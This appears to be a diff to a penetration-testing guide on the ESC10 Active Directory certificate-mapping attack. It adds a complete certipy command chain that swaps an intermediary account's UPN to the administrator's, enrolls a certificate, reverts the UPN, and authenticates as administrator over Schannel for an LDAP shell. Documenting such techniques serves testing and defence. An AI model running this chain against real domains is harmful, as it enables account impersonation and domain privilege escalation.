@@ -27,13 +27,18 @@ From an LDAP shell you perform the usual directory writes as the authenticated p
 
 ## The ESC10 angle
 
-ESC10 is **weak Schannel certificate mapping**: on the server performing Schannel auth (a DC for LDAPS), the `CertificateMappingMethods` registry value includes UPN mapping (bit `0x4`), so a certificate is matched to an account by its **UPN** rather than the strong SID binding. Combined with write access over a victim's UPN or `altSecurityIdentities`, you issue a certificate, point the mapping at the victim, and authenticate as them **over Schannel** (where PKINIT would be refused):
+ESC10 is **weak Schannel certificate mapping**: on the server performing Schannel auth (a DC for LDAPS), the `CertificateMappingMethods` registry value includes UPN mapping (bit `0x4`), so a certificate is matched to an account by its **UPN** rather than the strong SID binding. The path needs control of an **enrollable intermediary account**: set that account's `userPrincipalName` to the target's, enroll a certificate while the UPN matches, revert the UPN, then authenticate as the target **over Schannel** (where PKINIT would be refused):
 
 ```bash
-# After swapping the puppet account's UPN to the victim (see certificate mapping),
-# authenticate over Schannel because the weak mapping only applies there
-certipy auth -pfx puppet.pfx -ldap-shell -dc-ip <dc>
+# Point the intermediary's UPN at the target, enroll, then revert the UPN
+certipy account update -user puppet -upn administrator@example.local -dc-ip <dc>
+certipy req -ca <CA> -template User -username puppet@example.local -password <pw>
+certipy account update -user puppet -upn puppet@example.local -dc-ip <dc>
+# Authenticate over Schannel, because the weak UPN mapping only applies there
+certipy auth -pfx administrator.pfx -ldap-shell -dc-ip <dc>
 ```
+
+This is the UPN-based ESC10 chain; writing a target's `altSecurityIdentities` is a different, explicit-mapping path, not a prerequisite here.
 
 ## Exploitation notes
 
